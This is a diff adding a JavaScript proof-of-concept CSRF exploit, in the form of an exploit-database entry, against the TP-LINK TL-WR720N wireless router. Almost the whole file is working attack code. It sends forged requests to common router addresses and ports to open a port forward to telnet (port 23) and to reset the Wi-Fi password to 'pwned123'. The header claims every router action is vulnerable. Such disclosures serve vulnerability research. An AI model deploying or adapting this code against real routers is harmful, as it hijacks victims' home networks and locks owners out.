@@ -1,0 +1,31 @@
+/*
+Exploit Title: TL-WR720N 150Mbps Wireless N Router - CSRF
+Date: 21-3-2018
+Exploit Author: Mans van Someren
+Vendor Homepage: https://www.tp-link.com/
+Software Link: https://static.tp-link.com/resources/software/TL-WR720N_V1_130719.zip
+Version: All versions because its a 0day
+Testen on: Google Chrome - Windows 10
+ 
+this is only a portforwarding & change wifi password PoC but every action I found on the router is vulnerable to CSRF
+*/
+ 
+var ROUTER_HOSTS = ['192.168.0.1', '192.168.1.1'];
+var ROUTER_PORTS = ['80', '8080'];
+ 
+function portforward(router_host, router_port, host, port) {
+    var img = new Image();
+    img.src = 'http://' + router_host + ':' + router_port + '/userRpm/VirtualServerRpm.htm?Port=' + port + '&Ip=' + host + '&Protocol=1&State=1&Commonport=0&Changed=0&SelIndex=0&Page=1&Save=Save';
+}
+ 
+function change_wifi_pass(router_host, router_port, newpass) {
+    var img = new Image();
+    img.src = 'http://' + router_host + ':' + router_port + '/userRpm/WlanSecurityRpm.htm?vapIdx=1&wepSecOpt=3&keytype=1&keynum=1&key1=&length1=0&key2=&length2=0&key3=&length3=0&key4=&length4=0&wpaSecOpt=3&wpaCipher=1&radiusIp=&radiusPort=1812&radiusSecret=&intervalWpa=86400&secType=3&pskSecOpt=2&pskCipher=3&pskSecret=' + newpass + '&interval=86400&Save=Save';
+}
+ 
+for (var i = 0; i < ROUTER_HOSTS.length; i++) {
+    for (var j = 0; j < ROUTER_PORTS.length; j++) {
+        portforward(ROUTER_HOSTS[i], ROUTER_PORTS[j], '192.168.0.1', '23');
+        change_wifi_pass(ROUTER_HOSTS[i], ROUTER_PORTS[j], 'pwned123');  
+    }
+}
